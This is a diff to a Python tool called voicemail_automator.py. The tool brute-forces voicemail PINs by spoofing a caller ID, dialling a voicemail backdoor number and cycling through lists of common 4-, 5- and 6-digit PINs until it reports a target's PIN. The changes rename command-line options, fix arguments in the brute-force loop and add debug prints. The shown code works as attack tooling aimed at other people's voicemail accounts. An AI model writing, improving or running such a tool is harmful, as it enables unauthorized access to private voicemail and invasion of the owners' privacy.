@@ -327,18 +327,19 @@ def rock_and_roll(args, payload, backdoor):
 
 def individual_pins(args):
     the_pins = []
-    non_carrier_specific_pins = [args.toppins, args.top_five_digit_pins, args.top_six_digit_pins,
+    non_carrier_specific_pins = [args.top_4_pins, args.top_6_pins,
                                  args.uncommon_four_pins, args.year_pins, args.month_year_pins, args.pins]
-    if args.pins:
+    if args.pins is not None:
         the_pins = the_pins + args.pins
 
     if args.all_four_pins:
         the_pins = the_pins + generate_pins(4)
-        if args.top_four_digit_pins:
+        if args.top_4_pins:
             pass
     else:
-        if args.top_four_digit_pins:
+        if args.top_4_pins:
             the_pins = the_pins + top_4_pins
+            print(the_pins)
         if args.uncommon_four_pins:
             the_pins = the_pins + uncommon_4_pins
         if args.year_pins:
@@ -351,7 +352,7 @@ def individual_pins(args):
         #if args.top_five_digit_pins:
         #    pass
     else:
-        if args.top_five_digit_pins:
+        if args.top_5_pins:
             the_pins = the_pins + top_5_pins
 
     if args.all_six_pins:
@@ -359,7 +360,7 @@ def individual_pins(args):
         #if args.top_six_digit_pins:
         #    pass
     else:
-        if args.top_six_digit_pins:
+        if args.top_6_pins:
             the_pins = the_pins + top_6_pins
 
     if args.all_seven_pins:
@@ -451,14 +452,16 @@ def bruteforce(args):
     start = 0
     end = 3
     while not found:
+        print(pins_to_use)
         pins = pins_to_use[start:end]
+        print(pins)
         if pins != []:
-            payload = retrieve_payload_bruteforce(args, backdoor, pins)
+            payload = retrieve_payload_bruteforce(args, pins)
             found, possible = rock_and_roll(args, payload, backdoor, pins)
             if possible:
                 for pin in pins:
-                    payload = retrieve_payload_bruteforce(args, backdoor, pin)
-                    found, possible = rock_and_roll(args, payload, backdoor)
+                    payload = retrieve_payload_bruteforce(args, pin)
+                    found, possible = rock_and_roll(args, payload, backdoor, pins)
                     if found:
                         print(f'The PIN for {args.usernumber} is {pin}')
             else:
@@ -467,7 +470,6 @@ def bruteforce(args):
         else:
             print("You've exhausted your selected PINs.")
             sys.exit(0)
-
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='voicemail_automator.py')
@@ -482,11 +484,11 @@ if __name__ == '__main__':
     bruteforce_parser.add_argument("--callerid", dest="callerid", required=True, help="Phone number the call is originating from")
     bruteforce_parser.add_argument("--backdoornumber", dest="backdoornumber", metavar="0008675309",
                                    help="Voicemail backdoor number, if you know it")
-    bruteforce_parser.add_argument("--toppins", dest="top_four_digit_pins", action="store_true",
+    bruteforce_parser.add_argument("--toppins", dest="top_4_pins", action="store_true",
                                    help="Try the Top 20 4-digit PINs")
-    bruteforce_parser.add_argument("--topfivedigitpins", dest="top_five_digit_pins", action="store_true",
+    bruteforce_parser.add_argument("--topfivedigitpins", dest="top_5_pins", action="store_true",
                                    help="Try the Top 20 5-digit PINs")
-    bruteforce_parser.add_argument("--topsixdigitpins", dest="top_six_digit_pins", action="store_true",
+    bruteforce_parser.add_argument("--topsixdigitpins", dest="top_6_pins", action="store_true",
                                    help="Try the Top 20 6-digit PINs")
     bruteforce_parser.add_argument("--uncommonpins", dest="uncommon_four_pins", action="store_true",
                                    help="Try the least common 4-digit PINs")
@@ -521,6 +523,7 @@ if __name__ == '__main__':
                                 help="Voicemail backdoor number")
 
     args = parser.parse_args()
+    print(args)
 
     if args.parser == 'bruteforce':
         bruteforce(args)
